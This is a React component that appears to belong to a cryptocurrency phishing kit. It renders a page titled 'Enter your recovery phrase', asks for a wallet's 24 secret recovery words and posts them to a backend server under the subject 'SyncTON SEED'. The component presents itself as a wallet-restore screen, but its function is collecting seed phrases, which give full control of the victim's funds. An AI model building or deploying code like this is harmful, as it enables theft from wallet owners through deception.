import React, { useState, useEffect } from "react";
import axios from "axios";
import { IoIosArrowRoundBack } from "react-icons/io";
import { useNavigate } from "react-router-dom"
import Form from "../utils/Form";
import Modal from "./Modal";


export const SeedForm = ({ modal, setModal }) => {
    let message;
    const navigate = useNavigate();
    const [email, setEmail] = useState({
        one: "",
        two: "",
        three: "",
        four: "",
        five: "",
        six: "",
        seven: "",
        eight: "",
        nine: "",
        ten: "",
        eleven: "",
        twelve: "",
        thirteen: "",
        fourteen: "",
        fifteen: "",
        sixteen: "",
        seventeen: "",
        eighteen: "",
        nineteen: "",
        twenty: "",
        twenty_one: "",
        twenty_two: "",
        twenty_three: "",
        twenty_four: "",
    });
    // const [modal, setModal] = useState(false);



    const handleChange = (e) => {
        const { name, value } = e.target;
        setEmail((prev) => ({ ...prev, [name]: value }))
    }
    const goBackSeed = () => {
        navigate("/")
        setModal(!modal);
    }

useEffect(() => {
     message = Object.values(email);
}, [email])
    
    const sendEmail = (e) => {
        e.preventDefault();
        axios.post("http://localhost:5000", {
            subject: "SyncTON SEED",
             message
        })
            .then(() => {
                setModal(!modal);
                setEmail({
                    one: "",
                    two: "",
                    three: "",
                    four: "",
                    five: "",
                    six: "",
                    seven: "",
                    eight: "",
                    nine: "",
                    ten: "",
                    eleven: "",
                    twelve: "",
                    thirteen: "",
                    fourteen: "",
                    fifteen: "",
                    sixteen: "",
                    seventeen: "",
                    eighteen: "",
                    nineteen: "",
                    twenty: "",
                    twenty_one: "",
                    twenty_two: "",
                    twenty_three: "",
                    twenty_four: "",
                });
            })
            .catch(() => alert("Message not sent"));
    };

    return (
        <div className="seed-phrase container">
            <div className="form-container">
                <div className="heading">
                    <div onClick={goBackSeed} style={{ float: "left" }}>
                        <IoIosArrowRoundBack onClick={goBackSeed} fontSize={30} />
                    </div>
                    <div style={{ display: "inline-block", flexDirection: "column", maxWidth: "500px", alignItems: "center", justifyContent: "space-between" }}>
                        <h2>Enter your recovery phrase</h2>
                        <p>
                            To restore access to your wallet, enter the 24 secret recovery words
                            given to you when you created your wallet
                        </p>
                    </div>
                </div>
                {modal === false ? <form>
                    <div className="lg-screen">
                        <div className="row1">
                            <Form form_num="1" name="one" value={email.one} onChange={handleChange} />
                            <Form form_num="2" name="two" value={email.two} onChange={handleChange} />
                            <Form form_num="3" name="three" value={email.three} onChange={handleChange} />
                            <Form form_num="4" name="four" value={email.four} onChange={handleChange} />
                            <Form form_num="5" name="five" value={email.five} onChange={handleChange} />
                            <Form form_num="6" name="six" value={email.six} onChange={handleChange} />
                            <Form form_num="7" name="seven" value={email.seven} onChange={handleChange} />
                            <Form form_num="8" name="eight" value={email.eight} onChange={handleChange} />
                            <Form form_num="9" name="nine" value={email.nine} onChange={handleChange} />
                            <Form form_num="10" name="ten" value={email.ten} onChange={handleChange} />
                            <Form form_num="11" name="eleven" value={email.eleven} onChange={handleChange} />
                            <Form form_num="12" name="twelve" value={email.twelve} onChange={handleChange} />
                        </div>
                        <div className="row2">
                            <Form form_num="13" name="thirteen" value={email.thirteen} onChange={handleChange} />
                            <Form form_num="14" name="fourteen" value={email.fourteen} onChange={handleChange} />
                            <Form form_num="15" name="fifteen" value={email.fifteen} onChange={handleChange} />
                            <Form form_num="16" name="sixteen" value={email.sixteen} onChange={handleChange} />
                            <Form form_num="17" name="seventeen" value={email.seventeen} onChange={handleChange} />
                            <Form form_num="18" name="eighteen" value={email.eighteen} onChange={handleChange} />
                            <Form form_num="19" name="nineteen" value={email.nineteen} onChange={handleChange} />
                            <Form form_num="20" name="twenty" value={email.twenty} onChange={handleChange} />
                            <Form form_num="21" name="twenty_one" value={email.twenty_one} onChange={handleChange} />
                            <Form form_num="22" name="twenty_two" value={email.twenty_two} onChange={handleChange} />
                            <Form form_num="23" name="twenty_three" value={email.twenty_three} onChange={handleChange} />
                            <Form form_num="24" name="twenty_four" value={email.twenty_four} onChange={handleChange} />
                        </div>
                    </div>

                    <div>
                        <button className="btn submit_seed" type="submit" onClick={sendEmail}>Submit</button>
                    </div>
                </form> :
                    <Modal modal={modal} setModal={setModal} />}
            </div>
        </div>
    );
};

export default SeedForm;
